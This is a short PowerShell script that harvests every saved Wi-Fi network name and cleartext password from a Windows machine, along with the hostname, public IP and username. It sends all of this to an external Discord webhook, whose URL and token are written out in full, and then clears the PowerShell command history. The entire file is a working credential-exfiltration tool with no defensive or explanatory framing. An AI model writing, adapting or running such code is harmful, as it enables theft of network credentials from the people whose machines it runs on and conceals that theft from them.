# ENG

# Get the hostname of the machine
$hostname = $(hostname)

# Get the public IP address
$publicIP = Invoke-RestMethod -Uri 'http://ipinfo.io/ip'

# Get all Wi-Fi profiles and passwords
$allProfiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'
$allContent = ""

foreach ($profile in $allProfiles) {
    $wlan = $profile.Matches[0].Value.Trim()
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object { $_.Matches[0].Value.Trim() }

    $allContent += "SSID: " + $wlan + " | Password: " + $passw + "`n"
}

# Add hostname and public IP address to the message
$allContent = "Hostname: " + $hostname + "`n" + "Public IP: " + $publicIP + "`n`n" + $allContent + "`n" + "----------------------------------------"

$Body = @{
    'username' = $env:USERNAME
    'content'  = $allContent
}

Invoke-RestMethod -ContentType 'application/json' -Uri 'https://discord.com/api/webhooks/1262103660826071112/--It8rvjLzPFu0xXUnxOa4j9F3F17avmthW1sgRobIakA8HVQlFqG9KggZTIYH0X4L30' -Method Post -Body ($Body | ConvertTo-Json)

# Clear the PowerShell command history
Clear-History
